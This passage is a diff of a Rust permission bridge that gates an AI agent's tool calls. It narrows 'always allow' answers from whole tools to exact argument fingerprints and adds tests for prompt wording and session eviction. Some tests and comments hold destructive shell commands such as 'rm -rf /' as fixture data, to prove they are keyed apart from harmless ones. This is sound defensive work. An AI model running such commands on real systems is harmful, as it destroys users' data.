@@ -62,17 +62,30 @@ impl Decision {
     }
 }
 
-/// Remembered "always" answers, keyed by session and tool name.
+/// Remembered "always" answers, keyed by session, tool name, and — whenever the
+/// checks that still run cannot constrain the arguments — a fingerprint of those
+/// arguments.
 ///
-/// In memory only, and never cleared: they are scoped to one session id and die
-/// with the process, so a reloaded session in a fresh process asks again.
+/// In memory only: they are scoped to one session id and die with the process,
+/// so a reloaded session in a fresh process asks again. A session's answers are
+/// also dropped when that session is evicted.
 ///
-/// Tool name, not arguments: one "always allow" on `run_command` covers every
-/// later command in the session. Containment and sensitive-path checks still run
-/// on a remembered allow, but they read arguments as paths and a command line is
-/// one opaque string, so they do not constrain it. Documented in the README and
-/// tracked in TODO.md.
-type AlwaysKey = (String, String);
+/// The third element is the security argument for this key, and it is worth
+/// stating plainly. The sticky key must be as specific as the checks that still
+/// apply to a remembered allow. For a path-argument tool like `view_file`,
+/// containment and the sensitive-path list do still constrain a remembered
+/// allow, so the tool name is a defensible scope. Where they cannot, the key is
+/// the *only* thing scoping the answer and it has to carry the arguments.
+///
+/// "Where they cannot" is wider than command tools, and reading it narrowly is
+/// how the hole gets reopened. `escapes_containment` reads arguments as paths, so
+/// it is inert against a command line (one opaque string the shell reinterprets)
+/// *and* against a URL (not on the filesystem at all) *and* against whatever an
+/// unrecognised tool does with arguments this fork has never seen. All three get
+/// the fingerprint; see [`sticky_scope`], which grants `None` only to a tool that
+/// has earned it. Without this, "always allow" on `echo hello` also allowed
+/// `rm -rf build`, and "always allow" on one URL allowed every other.
+type AlwaysKey = (String, String, Option<String>);
 
 #[derive(Default)]
 struct BridgeState {
@@ -331,6 +344,24 @@ impl PermissionBridge {
         true
     }
 
+    /// Forgets a session's remembered answers, so "this session" means as long as
+    /// the session is live rather than as long as the process is.
+    ///
+    /// Called when a session is evicted. A session restored from `sessions.json`
+    /// afterwards is asked again, which is the safe direction: it also drops
+    /// remembered *denies*, so the user is prompted rather than auto-denied.
+    ///
+    /// Deliberately leaves `active_session` and `pending` alone. A pending request
+    /// belongs to a turn that is still running and its oneshot must resolve;
+    /// eviction says nothing about that.
+    pub async fn forget_session(&self, session_id: &str) {
+        let mut state = self.state.lock().await;
+        state.always.retain(|(sid, _, _), _| sid != session_id);
+        // Dropped too, or a dead conversation id keeps resolving to a session
+        // that no longer exists.
+        state.conversations.retain(|_, sid| sid != session_id);
+    }
+
     /// Routes an incoming JSON-RPC response back to the waiting hook. Returns
     /// `true` if the id belonged to this bridge.
     pub async fn resolve_response(&self, id: &Value, result: Option<Value>) -> bool {
@@ -436,7 +467,9 @@ impl PermissionBridge {
             return (Decision::Allow, reason);
         }
 
-        let always_key = (session_id.clone(), tool_name.clone());
+        let scope = sticky_scope(&tool_name, &args);
+        let always_scope = AlwaysScope::of(scope.as_ref(), &args);
+        let always_key = (session_id.clone(), tool_name.clone(), scope.clone());
         // Copied out before the branch: the body awaits the same mutex, and an
         // `if let` scrutinee guard would still be held inside it.
         let remembered = { self.state.lock().await.always.get(&always_key).copied() };
@@ -446,7 +479,10 @@ impl PermissionBridge {
                 self.mark_user_refusal(turn).await;
                 return (
                     Decision::Deny,
-                    format!("Always rejected `{tool_name}` in this session."),
+                    match always_scope.noun() {
+                        Some(noun) => format!("Always rejected {noun} in this session."),
+                        None => format!("Always rejected `{tool_name}` in this session."),
+                    },
                 );
             }
             // A remembered allow is only honoured for calls the bridge itself would
@@ -456,7 +492,10 @@ impl PermissionBridge {
             if !self.escapes_containment(&args).await {
                 return (
                     Decision::Allow,
-                    format!("Always allowed `{tool_name}` in this session."),
+                    match always_scope.noun() {
+                        Some(noun) => format!("Always allowed {noun} in this session."),
+                        None => format!("Always allowed `{tool_name}` in this session."),
+                    },
                 );
             }
         }
@@ -488,7 +527,7 @@ impl PermissionBridge {
                     "kind": tool_kind(&tool_name),
                     "rawInput": args,
                 },
-                "options": permission_options(&tool_name),
+                "options": permission_options(&tool_name, always_scope),
             },
         });
 
@@ -521,7 +560,8 @@ impl PermissionBridge {
             }
         };
 
-        self.apply_outcome(&outcome, always_key, &tool_name, turn).await
+        self.apply_outcome(&outcome, always_key, &tool_name, always_scope, turn)
+            .await
     }
 
     /// True when `args` leaves the workspace or names something sensitive — the
@@ -568,6 +608,7 @@ impl PermissionBridge {
         outcome: &Value,
         always_key: AlwaysKey,
         tool_name: &str,
+        scope: AlwaysScope,
         turn: u64,
     ) -> (Decision, String) {
         let outcome = outcome.get("outcome").unwrap_or(outcome);
@@ -587,18 +628,40 @@ impl PermissionBridge {
             .get("optionId")
             .and_then(|v| v.as_str())
             .unwrap_or(OPTION_REJECT_ONCE);
+        // The scope is the same value the label was worded from, so the reason
+        // agy sees cannot describe a breadth the user was not offered. Assert the
+        // key agrees, since these are the two things that must never diverge.
+        debug_assert_eq!(
+            always_key.2.is_some(),
+            scope != AlwaysScope::Tool,
+            "the label's scope and the key's scope disagree"
+        );
 
         let (decision, sticky, reason) = match option_id {
             OPTION_ALLOW_ONCE => (Decision::Allow, false, "Approved by user.".to_string()),
             OPTION_ALLOW_ALWAYS => (
                 Decision::Allow,
                 true,
-                format!("Approved by user; always allowing `{tool_name}` in this session."),
+                match scope.noun() {
+                    Some(noun) => {
+                        format!("Approved by user; always allowing {noun} in this session.")
+                    }
+                    None => {
+                        format!("Approved by user; always allowing `{tool_name}` in this session.")
+                    }
+                },
             ),
             OPTION_REJECT_ALWAYS => (
                 Decision::Deny,
                 true,
-                format!("Declined by user; always rejecting `{tool_name}` in this session."),
+                match scope.noun() {
+                    Some(noun) => {
+                        format!("Declined by user; always rejecting {noun} in this session.")
+                    }
+                    None => {
+                        format!("Declined by user; always rejecting `{tool_name}` in this session.")
+                    }
+                },
             ),
             _ => (Decision::Deny, false, "Declined by user.".to_string()),
         };
@@ -637,24 +700,85 @@ const OPTION_ALLOW_ALWAYS: &str = "allow_always";
 const OPTION_REJECT_ONCE: &str = "reject_once";
 const OPTION_REJECT_ALWAYS: &str = "reject_always";
 
+/// What the two "always" labels claim the answer covers.
+///
+/// Derived once, in `decide`, from the same `sticky_scope` result that builds the
+/// key, and then handed to both the prompt and [`PermissionBridge::apply_outcome`]
+/// -- so the button, the stored key and the reason string cannot disagree about
+/// scope. They were previously derived independently in those three places, with
+/// nothing tying them together, and the label drifted from the key.
+#[derive(Clone, Copy, PartialEq, Eq, Debug)]
+enum AlwaysScope {
+    /// Every later call to this tool, for this session. What the answer covers
+    /// when `sticky_scope` returns `None`.
+    Tool,
+    /// This exact command line and no other. The prompt's title is already
+    /// ``Run `{command}` `` (see [`tool_title`]), so "this exact command" refers
+    /// to something shown directly above the buttons.
+    Command,
+    /// This exact call -- same tool, same arguments. The answer is keyed by the
+    /// arguments, but the arguments are not a command, so calling it one would be
+    /// a lie: `read_url_content` and `search_web` land here, as does every tool
+    /// this fork does not know. Nothing above the buttons reads as a command, and
+    /// a label must describe what is actually being consented to.
+    Call,
+}
+
+impl AlwaysScope {
+    /// `scope` is the `sticky_scope` result the key is built from; `args` decides
+    /// only the wording, never the breadth.
+    fn of(scope: Option<&String>, args: &Value) -> Self {
+        match scope {
+            None => AlwaysScope::Tool,
+            Some(_) if has_command_line(args) => AlwaysScope::Command,
+            Some(_) => AlwaysScope::Call,
+        }
+    }
+
+    /// The noun the labels and reasons agree on. `None` for [`AlwaysScope::Tool`],
+    /// which names the tool instead.
+    fn noun(self) -> Option<&'static str> {
+        match self {
+            AlwaysScope::Tool => None,
+            AlwaysScope::Command => Some("this exact command"),
+            AlwaysScope::Call => Some("this exact call"),
+        }
+    }
+}
+
 /// The four answers offered with every prompt.
 ///
 /// `kind` is the ACP enum the host styles on; `name` is free display text and is
-/// ours to word. The "always" labels name the tool and say "this session"
-/// because that is what the answer covers -- every later call to that tool, for
-/// this session only -- and the prompt is where someone decides, not the README.
-fn permission_options(tool_name: &str) -> Value {
+/// ours to word. The "always" labels say "this session" because that is the outer
+/// bound on every remembered answer, and name the scope inside it -- the tool, or
+/// the one command or call in front of the user. The prompt is where someone
+/// decides, not the README.
+///
+/// The scope arrives as an [`AlwaysScope`], not as the command text: nothing in
+/// the label needs the string, and passing it would invite someone to interpolate
+/// it.
+fn permission_options(tool_name: &str, scope: AlwaysScope) -> Value {
+    let (allow_always, reject_always) = match scope.noun() {
+        Some(noun) => (
+            format!("Always allow {noun} this session"),
+            format!("Always reject {noun} this session"),
+        ),
+        None => (
+            format!("Always allow {tool_name} this session"),
+            format!("Always reject {tool_name} this session"),
+        ),
+    };
     json!([
         { "optionId": OPTION_ALLOW_ONCE, "name": "Allow once", "kind": "allow_once" },
         {
             "optionId": OPTION_ALLOW_ALWAYS,
-            "name": format!("Always allow {tool_name} this session"),
+            "name": allow_always,
             "kind": "allow_always",
         },
         { "optionId": OPTION_REJECT_ONCE, "name": "Reject", "kind": "reject_once" },
         {
             "optionId": OPTION_REJECT_ALWAYS,
-            "name": format!("Always reject {tool_name} this session"),
+            "name": reject_always,
             "kind": "reject_always",
         },
     ])
@@ -959,6 +1083,127 @@ fn path_field_args(args: &Value) -> Vec<String> {
     let mut found = Vec::new();
     walk(args, false, &mut found);
     found
+}
+
+/// Model-authored display and pacing fields, observed to differ between two
+/// otherwise identical calls to agy 1.1.22. They cannot change what a command is
+/// or where it runs, so they are excluded from the sticky key; leaving them in
+/// would make "Always allow" never match on a repeat, and an option that visibly
+/// does nothing teaches people to stop reading the prompt.
+///
+/// A denylist rather than an allowlist, and that is the load-bearing choice. An
+/// allowlist of "the fields that decide what runs" would be `CommandLine` and
+/// `Cwd` today, and a field agy adds later would fall outside the key silently,
+/// which is a hole. With a denylist a new field lands *inside* the key; if it is
+/// volatile the symptom is a reprompt, which is visible and harmless.
+/// Under-normalizing costs a prompt, over-normalizing is a hole.
+///
+/// Every addition here is a normalization step and needs the same argument made:
+/// that the field cannot affect what the tool does. `WaitMsBeforeAsync` is the
+/// borderline one — it is behavioural, not presentational, but it can only change
+/// how long the adapter waits before backgrounding a command, not what runs or
+/// where. It is the entry most worth revisiting if this list ever grows.
+const UNKEYED_FIELDS: &[&str] = &["toolAction", "toolSummary", "WaitMsBeforeAsync"];
+
+/// Fingerprints tool arguments for the sticky key: the argument object minus the
+/// volatile fields, serialized.
+///
+/// Top level only, deliberately, and not a recursive strip. Recursion would be
+/// over-normalization — it would remove a nested `toolSummary` living inside some
+/// future structured argument where the value does matter, merging two argument
+/// sets that are not the same into one key. Leaving a nested volatile field in
+/// costs a reprompt instead. Note the contrast with [`path_field_args`], which
+/// does recurse: that one is looking for a reason to *ask*, so a deeper search is
+/// the conservative direction there and the opposite direction here.
+///
+/// The filtering and the serialization live together on purpose. They must never
+/// be reachable separately, or the next reader will fingerprint the unfiltered
+/// form and quietly restore the bug this key exists to close.
+fn args_fingerprint(args: &Value) -> String {
+    match args {
+        Value::Object(map) => {
+            let kept: serde_json::Map<String, Value> = map
+                .iter()
+                .filter(|(key, _)| !UNKEYED_FIELDS.contains(&key.as_str()))
+                .map(|(key, value)| (key.clone(), value.clone()))
+                .collect();
+            Value::Object(kept).to_string()
+        }
+        other => other.to_string(),
+    }
+}
+
+/// How specific a remembered answer for this call has to be.
+///
+/// `None` is tool-level keying, and it has to be *earned*. A tool qualifies only
+/// when the checks that still run on a remembered allow can actually read its
+/// arguments: `escapes_containment` and the sensitive-path list read arguments as
+/// paths, so for a path-argument tool like `view_file` they do constrain a
+/// remembered allow and the tool name is a defensible scope. That is what
+/// `KEYED_BY_TOOL_KINDS` names.
+///
+/// Everything else — including every tool this fork has never heard of — gets
+/// `Some(fingerprint)`. The default direction is the whole point. An unknown tool
+/// that turns out to execute something would otherwise land on the weaker key and
+/// silently restore the bug this exists to close; being wrong the other way costs
+/// a reprompt. Under-normalizing costs a prompt, over-normalizing is a hole.
+///
+/// [`has_unconstrained_reach`] stays as a second line, and it is not redundant
+/// with the kind list: kind is a *display* classification, and a tool can be
+/// classified `"read"` while reaching somewhere the path checks cannot see.
+/// `read_url_content` is exactly that — kind `"read"`, but its argument is a
+/// `Url`, which is not a path field, so containment and the sensitive-path list
+/// are as inert against it as they are against a command line. Keying it by tool
+/// would let one "Always allow" on a trusted URL cover every later URL. The walk
+/// is nested rather than a top-level `args.get`, since a nested or renamed field
+/// would otherwise inherit the path tool's weaker key.
+fn sticky_scope(tool_name: &str, args: &Value) -> Option<String> {
+    if !KEYED_BY_TOOL_KINDS.contains(&tool_kind(tool_name)) || has_unconstrained_reach(args) {
+        return Some(args_fingerprint(args));
+    }
+    None
+}
+
+/// Tool kinds whose remembered answers may be keyed by tool name alone, because
+/// containment and the sensitive-path list still constrain them.
+///
+/// Deliberately not `"execute"`, `"fetch"`, or `"other"`. `"other"` is the
+/// important one: it is what [`tool_kind`] returns for a name this fork does not
+/// know, and an unknown tool must get the stronger key, not the weaker one.
+const KEYED_BY_TOOL_KINDS: &[&str] = &["read", "edit", "search"];
+
+/// Whether a `CommandLine` field appears anywhere in the arguments.
+///
+/// Wording only: this decides whether the prompt says "command" or "call", never
+/// how broad the remembered answer is. [`has_unconstrained_reach`] decides that.
+fn has_command_line(args: &Value) -> bool {
+    match args {
+        Value::Array(items) => items.iter().any(has_command_line),
+        Value::Object(map) => map
+            .iter()
+            .any(|(key, value)| key == "CommandLine" || has_command_line(value)),
+        _ => false,
+    }
+}
+
+/// Whether the arguments reach somewhere the path checks cannot follow.
+///
+/// Two shapes, both of which make `escapes_containment` and the sensitive-path
+/// list inert: a `CommandLine`, which is one opaque string the shell will
+/// reinterpret, and a `Url`, which names a resource that is not on the filesystem
+/// at all. A bare `://` anywhere in a string value counts too, so a tool that
+/// takes a URL under some other field name is still caught. That last test also
+/// fires on a search query that happens to contain `://`, which costs a reprompt
+/// and is the direction to be wrong in.
+fn has_unconstrained_reach(args: &Value) -> bool {
+    match args {
+        Value::String(s) => s.contains("://"),
+        Value::Array(items) => items.iter().any(has_unconstrained_reach),
+        Value::Object(map) => map.iter().any(|(key, value)| {
+            key == "CommandLine" || key == "Url" || has_unconstrained_reach(value)
+        }),
+        _ => false,
+    }
 }
 
 /// Collects every absolute-looking path appearing in the tool arguments.
@@ -2155,12 +2400,17 @@ mod tests {
         // now -- the host already answered, and only the applying is outstanding.
         bridge.set_active_session(Some("session-2")).await;
 
-        let key = ("session-1".to_string(), "run_command".to_string());
+        let key = (
+            "session-1".to_string(),
+            "run_command".to_string(),
+            Some("{}".to_string()),
+        );
         let (decision, _) = bridge
             .apply_outcome(
                 &json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } }),
                 key.clone(),
                 "run_command",
+                AlwaysScope::Command,
                 asking_turn,
             )
             .await;
@@ -2178,6 +2428,7 @@ mod tests {
                 &json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } }),
                 key,
                 "run_command",
+                AlwaysScope::Command,
                 current_turn,
             )
             .await;
@@ -2359,12 +2610,17 @@ mod tests {
         // and `abandon_pending` has nothing to find. Only the applying is left.
         bridge.set_active_session(None).await;
 
-        let key = ("session-1".to_string(), "run_command".to_string());
+        let key = (
+            "session-1".to_string(),
+            "run_command".to_string(),
+            Some("{}".to_string()),
+        );
         bridge
             .apply_outcome(
                 &json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } }),
                 key.clone(),
                 "run_command",
+                AlwaysScope::Command,
                 asking_turn,
             )
             .await;
@@ -2379,6 +2635,7 @@ mod tests {
                 &json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } }),
                 key,
                 "run_command",
+                AlwaysScope::Command,
                 asking_turn,
             )
             .await;
@@ -2400,12 +2657,17 @@ mod tests {
         let asking_turn = bridge.state.lock().await.turn_generation;
         bridge.set_active_session(Some("session-2")).await;
 
-        let key = ("session-1".to_string(), "run_command".to_string());
+        let key = (
+            "session-1".to_string(),
+            "run_command".to_string(),
+            Some("{}".to_string()),
+        );
         let (decision, _) = bridge
             .apply_outcome(
                 &json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } }),
                 key.clone(),
                 "run_command",
+                AlwaysScope::Command,
                 asking_turn,
             )
             .await;
@@ -2445,19 +2707,42 @@ mod tests {
             .await;
         assert_eq!(first.await.unwrap().0, Decision::Deny);
 
-        // Second call: same tool, so the remembered reject must apply with no new
-        // prompt — regardless of what the arguments are.
+        // Second call: the same command, so the remembered reject applies with no
+        // new prompt.
         let (decision, _) = bridge
             .decide(&json!({
                 "conversationId": "conv-1",
-                "toolCall": { "name": "run_command", "args": { "CommandLine": "rm -rf /" } },
+                "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
             }))
             .await;
         assert_eq!(decision, Decision::Deny);
         assert!(
             rx.try_recv().is_err(),
-            "the remembered reject must not prompt again"
+            "the remembered reject must not prompt again for the same command"
         );
+
+        // A different command is asked about. Keying cuts both ways: the user
+        // rejected `ls`, not every command for the rest of the session. This is a
+        // real reduction in what one reject covers, and is documented as such.
+        let asking = {
+            let bridge = bridge.clone();
+            tokio::spawn(async move {
+                bridge
+                    .decide(&json!({
+                        "conversationId": "conv-1",
+                        "toolCall": { "name": "run_command", "args": { "CommandLine": "pwd" } },
+                    }))
+                    .await
+            })
+        };
+        let request = expect_permission_request(&mut rx).await;
+        bridge
+            .resolve_response(
+                &request["id"],
+                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
+            )
+            .await;
+        assert_eq!(asking.await.unwrap().0, Decision::Deny);
     }
 
     /// Records a remembered "Always allow" for `run_command` and returns the bridge.
@@ -2488,7 +2773,7 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn the_always_options_say_what_they_cover() {
+    async fn the_always_options_name_the_command_for_command_tools() {
         let workspace = std::env::temp_dir().join("agy-acp-option-label-test");
         std::fs::create_dir_all(&workspace).unwrap();
         let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;
@@ -2513,16 +2798,18 @@ mod tests {
                 .unwrap()
                 .to_string()
         };
-        // The answer covers the tool for the session, so the label has to say so:
-        // this prompt is where someone decides, and it shows only one command.
+        // The answer covers this command, so the label has to say so. It does not
+        // repeat the command text: the prompt's title is already ``Run `ls` ``,
+        // shown directly above these buttons.
         assert_eq!(
             named("allow_always"),
-            "Always allow run_command this session"
+            "Always allow this exact command this session"
         );
         assert_eq!(
             named("reject_always"),
-            "Always reject run_command this session"
+            "Always reject this exact command this session"
         );
+        assert_eq!(request["params"]["toolCall"]["title"], "Run `ls`");
         // The ACP kinds stay standard so hosts can still style and bind them.
         for kind in ["allow_once", "allow_always", "reject_once", "reject_always"] {
             assert!(options.iter().any(|o| o["kind"] == kind), "missing {kind}");
@@ -2537,57 +2824,734 @@ mod tests {
         assert_eq!(asking.await.unwrap().0, Decision::Deny);
     }
 
-    /// Pins a known gap, tracked in TODO.md: sticky answers are keyed by tool
-    /// name, so approving one command approves every later command. This test
-    /// asserts today's behaviour deliberately -- when the gap is closed it will
-    /// fail, which is the point: the fix must come with a doc change.
+    /// A narrow key is not the same claim as "this is a command". `read_url_content`
+    /// is keyed by its arguments -- a `Url` is not a path, so containment cannot
+    /// constrain it -- but nothing above the buttons is a command, and the title
+    /// says so. A label that called it one would be asking the user to consent to
+    /// a description of the call that is simply false.
     #[tokio::test]
-    async fn always_allow_is_remembered_per_tool_not_per_command() {
-        let workspace = std::env::temp_dir().join("agy-acp-always-per-tool-test");
+    async fn the_always_options_do_not_call_a_url_fetch_a_command() {
+        let workspace = std::env::temp_dir().join("agy-acp-option-label-url-test");
+        std::fs::create_dir_all(&workspace).unwrap();
+        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;
+
+        let asking = {
+            let bridge = bridge.clone();
+            tokio::spawn(async move {
+                bridge
+                    .decide(&json!({
+                        "conversationId": "conv-1",
+                        "toolCall": {
+                            "name": "read_url_content",
+                            "args": { "Url": "https://example.com/readme" },
+                        },
+                    }))
+                    .await
+            })
+        };
+        let request = expect_permission_request(&mut rx).await;
+        let options = request["params"]["options"].as_array().unwrap().clone();
+        let named = |kind: &str| -> String {
+            options.iter().find(|o| o["kind"] == kind).unwrap()["name"]
+                .as_str()
+                .unwrap()
+                .to_string()
+        };
+
+        assert_eq!(
+            named("allow_always"),
+            "Always allow this exact call this session"
+        );
+        assert_eq!(
+            named("reject_always"),
+            "Always reject this exact call this session"
+        );
+        // Not the tool-level wording either: the answer really is narrow, and a
+        // label promising less than the key stores would be the safe lie rather
+        // than the dangerous one, but it would still be a lie.
+        for kind in ["allow_always", "reject_always"] {
+            assert!(
+                !named(kind).contains("read_url_content"),
+                "{kind} must not claim tool-level scope: {}",
+                named(kind)
+            );
+        }
+
+        bridge
+            .resolve_response(
+                &request["id"],
+                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
+            )
+            .await;
+        assert_eq!(asking.await.unwrap().0, Decision::Deny);
+    }
+
+    /// Forgetting a session drops its conversation binding as well as its
+    /// answers, and the drain can do that to a session that has just been
+    /// readmitted -- the cancel in `keep_session_answers` only reaches a forget
+    /// still sitting in the queue. The question that matters is what the loss of
+    /// the binding costs, since a misrouted hook would be a real defect where an
+    /// extra prompt is not.
+    ///
+    /// It costs nothing. A session is readmitted by its own turn, and the adapter
+    /// runs one turn at a time, so throughout the window where the binding is
+    /// missing that session is the active one and the fallback resolves to it by
+    /// construction. The binding is re-registered at turn teardown
+    /// (`adapter.rs`), so the window closes with the turn. The fallback can only
+    /// name a *different* session if some other session's turn is running, which
+    /// is the thing serialization rules out.
+    #[tokio::test]
+    async fn a_forgotten_binding_still_reaches_its_own_running_turn() {
+        let workspace = std::env::temp_dir().join("agy-acp-forgotten-binding-test");
+        std::fs::create_dir_all(&workspace).unwrap();
+        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;
+
+        // The drain wins the race: the binding goes while session-1's turn runs.
+        bridge.forget_session("session-1").await;
+        assert!(
+            !bridge
+                .state
+                .lock()
+                .await
+                .conversations
+                .contains_key("conv-1"),
+            "the binding must actually be gone for this to prove anything"
+        );
+
+        let asking = {
+            let bridge = bridge.clone();
+            tokio::spawn(async move {
+                bridge
+                    .decide(&json!({
+                        "conversationId": "conv-1",
+                        "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
+                    }))
+                    .await
+            })
+        };
+
+        // Asked, not denied, and asked of the session whose turn is running.
+        let request = expect_permission_request(&mut rx).await;
+        assert_eq!(request["params"]["sessionId"], "session-1");
+        bridge
+            .resolve_response(
+                &request["id"],
+                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_once" } })),
+            )
+            .await;
+        assert_eq!(asking.await.unwrap().0, Decision::Allow);
+    }
+
+    /// The reason a *remembered* answer carries has to use the same noun the
+    /// button used, or the explanation contradicts the consent it came from. This
+    /// is a third site, reached on the second and every later call, and it drifted
+    /// while the first two were being fixed.
+    #[tokio::test]
+    async fn a_remembered_answer_is_explained_in_the_words_it_was_given_in() {
+        let workspace = std::env::temp_dir().join("agy-acp-remembered-wording-test");
+        std::fs::create_dir_all(&workspace).unwrap();
+        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;
+
+        let call = json!({
+            "conversationId": "conv-1",
+            "toolCall": {
+                "name": "read_url_content",
+                "args": { "Url": "https://example.com/readme" },
+            },
+        });
+
+        // First call: answer "always allow" at the prompt.
+        let asking = {
+            let bridge = bridge.clone();
+            let call = call.clone();
+            tokio::spawn(async move { bridge.decide(&call).await })
+        };
+        let request = expect_permission_request(&mut rx).await;
+        bridge
+            .resolve_response(
+                &request["id"],
+                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } })),
+            )
+            .await;
+        let (decision, reason) = asking.await.unwrap();
+        assert_eq!(decision, Decision::Allow);
+        assert!(reason.contains("this exact call"), "at the prompt: {reason}");
+
+        // Second call: the remembered answer applies with no prompt, and explains
+        // itself the same way.
+        let (decision, reason) = bridge.decide(&call).await;
+        assert_eq!(decision, Decision::Allow);
+        assert_eq!(reason, "Always allowed this exact call in this session.");
+        assert!(
+            !reason.contains("command"),
+            "a URL fetch is not a command: {reason}"
+        );
+    }
+
+    /// The wording is chosen by [`AlwaysScope`], and the enum is what keeps the
+    /// button, the key and the reason string from drifting apart. Pin the mapping
+    /// directly so a fourth case cannot be added without deciding what it says.
+    #[test]
+    fn the_always_scope_decides_the_wording() {
+        assert_eq!(AlwaysScope::of(None, &json!({})), AlwaysScope::Tool);
+        assert_eq!(
+            AlwaysScope::of(Some(&"{}".to_string()), &json!({ "CommandLine": "ls" })),
+            AlwaysScope::Command
+        );
+        assert_eq!(
+            AlwaysScope::of(Some(&"{}".to_string()), &json!({ "Url": "https://x.test" })),
+            AlwaysScope::Call
+        );
+        // Only `Tool` names the tool; the other two must supply a noun.
+        assert_eq!(AlwaysScope::Tool.noun(), None);
+        assert!(AlwaysScope::Command.noun().is_some());
+        assert!(AlwaysScope::Call.noun().is_some());
+        assert_ne!(AlwaysScope::Command.noun(), AlwaysScope::Call.noun());
+    }
+
+    /// Path tools keep the tool-level wording, because they keep the tool-level
+    /// key -- containment and the sensitive-path list still constrain them.
+    #[tokio::test]
+    async fn the_always_options_name_the_tool_for_path_tools() {
+        let workspace = std::env::temp_dir().join("agy-acp-option-label-path-test");
+        std::fs::create_dir_all(&workspace).unwrap();
+        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;
+
+        let target = workspace.join("a.txt");
+        let asking = {
+            let bridge = bridge.clone();
+            let target = target.display().to_string();
+            tokio::spawn(async move {
+                bridge
+                    .decide(&json!({
+                        "conversationId": "conv-1",
+                        "toolCall": { "name": "view_file", "args": { "TargetFile": target } },
+                    }))
+                    .await
+            })
+        };
+        let request = expect_permission_request(&mut rx).await;
+        let options = request["params"]["options"].as_array().unwrap().clone();
+        let named = |kind: &str| -> String {
+            options.iter().find(|o| o["kind"] == kind).unwrap()["name"]
+                .as_str()
+                .unwrap()
+                .to_string()
+        };
+        assert_eq!(named("allow_always"), "Always allow view_file this session");
+        assert_eq!(named("reject_always"), "Always reject view_file this session");
+        for kind in ["allow_once", "allow_always", "reject_once", "reject_always"] {
+            assert!(options.iter().any(|o| o["kind"] == kind), "missing {kind}");
+        }
+
+        bridge
+            .resolve_response(
+                &request["id"],
+                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
+            )
+            .await;
+        assert_eq!(asking.await.unwrap().0, Decision::Deny);
+    }
+
+    /// The security property of the fingerprint, stated directly: two argument
+    /// sets that would run different things must never share a key. Key order is
+    /// not a difference (serde_json sorts, with no `preserve_order` feature), but
+    /// everything that decides what runs is.
+    #[test]
+    fn different_arguments_never_share_a_fingerprint() {
+        let fp = |v: Value| args_fingerprint(&v);
+
+        // Key order is not a difference -- the same arguments written two ways.
+        assert_eq!(
+            fp(json!({ "CommandLine": "ls", "Cwd": "/a" })),
+            fp(json!({ "Cwd": "/a", "CommandLine": "ls" })),
+            "key order must not split one command into two keys"
+        );
+
+        // Everything that changes what runs, does.
+        let base = json!({ "CommandLine": "ls", "Cwd": "/a" });
+        for different in [
+            json!({ "CommandLine": "rm -rf /", "Cwd": "/a" }),
+            json!({ "CommandLine": "ls", "Cwd": "/b" }),
+            json!({ "CommandLine": "ls" }),
+            json!({ "CommandLine": "ls", "Cwd": "/a", "Extra": "added later" }),
+            // A field agy adds later lands *inside* the key: the denylist means a
+            // new field costs a reprompt, never a silent match.
+            json!({ "CommandLine": "ls", "Cwd": "/a", "Sudo": true }),
+        ] {
+            assert_ne!(fp(base.clone()), fp(different.clone()), "{different}");
+        }
+
+        // Types are not interchangeable: "1" is not 1, and neither is true.
+        assert_ne!(fp(json!({ "A": "1" })), fp(json!({ "A": 1 })));
+        assert_ne!(fp(json!({ "A": 1 })), fp(json!({ "A": true })));
+
+        // Only the three named fields are stripped, and only at the top.
+        assert_eq!(
+            fp(json!({ "CommandLine": "ls", "toolSummary": "x" })),
+            fp(json!({ "CommandLine": "ls", "toolSummary": "y" }))
+        );
+        assert_ne!(
+            fp(json!({ "CommandLine": "ls", "nested": { "toolSummary": "x" } })),
+            fp(json!({ "CommandLine": "ls", "nested": { "toolSummary": "y" } }))
+        );
+    }
+
+    /// D2: exact byte equality, no normalization. Each normalization step merges
+    /// commands that are not identical, and tool-level keying is the degenerate
+    /// case of normalizing everything away -- which is how the original bug arose.
+    /// A future ergonomic tweak has to argue with this assertion.
+    #[tokio::test]
+    async fn sticky_answers_are_not_normalized() {
+        let workspace = std::env::temp_dir().join("agy-acp-no-normalization-test");
         std::fs::create_dir_all(&workspace).unwrap();
         let (bridge, mut rx) =
             bridge_with_run_command_always_allowed(&workspace.display().to_string()).await;
 
-        // A completely different, destructive command. "Always allow" was never
-        // asked about this one, and the user is not consulted.
+        // "ls " is not "ls".
+        let asking = {
+            let bridge = bridge.clone();
+            tokio::spawn(async move {
+                bridge
+                    .decide(&json!({
+                        "conversationId": "conv-1",
+                        "toolCall": { "name": "run_command", "args": { "CommandLine": "ls " } },
+                    }))
+                    .await
+            })
+        };
+        let request = expect_permission_request(&mut rx).await;
+        bridge
+            .resolve_response(
+                &request["id"],
+                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
+            )
+            .await;
+        assert_eq!(asking.await.unwrap().0, Decision::Deny);
+    }
+
+    /// D3: the two detectors are a union. All four cases, not two -- asserting
+    /// only both-fire and neither-fire would pass an implementation that wrote
+    /// one detector and dropped the other.
+    #[test]
+    fn tool_level_keying_has_to_be_earned() {
+        // A known command tool, whatever its argument shape.
+        assert!(sticky_scope("run_command", &json!({ "Something": "else" })).is_some());
+        assert!(sticky_scope("run_command", &json!({ "CommandLine": "ls" })).is_some());
+
+        // The case that matters most: a tool this fork has never heard of. It
+        // gets the *stronger* key, however its arguments are shaped and whatever
+        // its command field is called. Under the old union-of-detectors rule
